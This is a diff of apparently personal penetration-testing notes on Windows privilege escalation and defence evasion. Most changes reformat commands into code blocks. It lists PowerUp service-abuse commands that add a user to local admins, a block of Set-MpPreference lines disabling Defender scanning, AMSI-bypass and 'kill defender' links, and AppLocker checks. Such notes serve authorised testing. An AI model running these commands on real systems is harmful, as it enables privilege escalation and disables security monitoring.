@@ -15,27 +15,37 @@
 
 ## Service Issues using PowerUp
 
-**Do all checks**\
-. .\PowerUp.ps1\
+**Do all checks**
+
+```powershell
+. .\PowerUp.ps1
 Invoke-AllChecks
+```
 
 The Parameter "StartName" is the privilege e.g. LocalSystem\
 The Parameter "CanRestart" is useful so we can restart it on our own and dont have to restart machine/wait until the service is restarted
 
-**Get services with unquoted paths an a space in their name**\
-GetServiceUnquoted -Verbose\
-Get-WmiObject -Class win32\_service | select pathname
+**Get services with unquoted paths an a space in their name**
 
-**Get services where the current user can write to its binary path or change arguments to the binary**\
-Get-ModifiableServiceFile -Verbose&#x20;
+```powershell
+GetServiceUnquoted -Verbose
+Get-WmiObject -Class win32_service | select pathname
+```
 
-\=> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dom\username'\
-\=> Add your domain user to local admin group!
+**Get services where the current user can write to its binary path or change arguments to the binary**
 
-**Get the services whose configuration current user can modify (e.g ACLs of the Service, maybe point service to different executable**\
-****Get-ModifiableService -Verbose&#x20;
+```powershell
+Get-ModifiableServiceFile -Verbose 
+=> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dom\username'
+=> Add your domain user to local admin group!
 
+```
 
+**Get the services whose configuration current user can modify (e.g ACLs of the Service, maybe point service to different executable**
+
+```powershell
+Get-ModifiableService -Verbose 
+```
 
 ## Abusing Enterprise Applications
 
@@ -64,33 +74,44 @@ Get-ModifiableServiceFile -Verbose&#x20;
 **AMSI Bypass**\
 ****amsi.fail
 
-**Disable AV Protection/Monitoring**\
-Set-MpPreference -DisableRealtimeMonitoring $true
+**Disable AV Protection/Monitoring**
 
-Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue \
-Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue \
+{% code overflow="wrap" %}
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+```
+{% endcode %}
 
 Kill defender:\
 [https://bidouillesecurity.com/disable-windows-defender-in-powershell/](https://bidouillesecurity.com/disable-windows-defender-in-powershell/)\
 [https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1](https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1)
 
-**Check Powershell Language Mode**\
+**Check Powershell Language Mode**
+
+{% code overflow="wrap" %}
+```powershell
 $ExecutionContext.SessionState.LanguageMode
+```
+{% endcode %}
 
-**AppLocker Policy**\
+\
+**AppLocker Policy**
+
+{% code overflow="wrap" %}
+```powershell
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-
-
-
-
+```
+{% endcode %}
 
 **Identify Code/Strings Defender may flag**\
 https://github.com/matterpreter/DefenderCheck => C# without builds\
@@ -138,7 +159,7 @@ Invoke-PrivEsc
 
 {% embed url="https://github.com/HarmJ0y/PowerUp" %}
 
-```
+```powershell
 . ./powerup
 Invoke-allchecks
 Get-ServiceUnquoted -Verbose
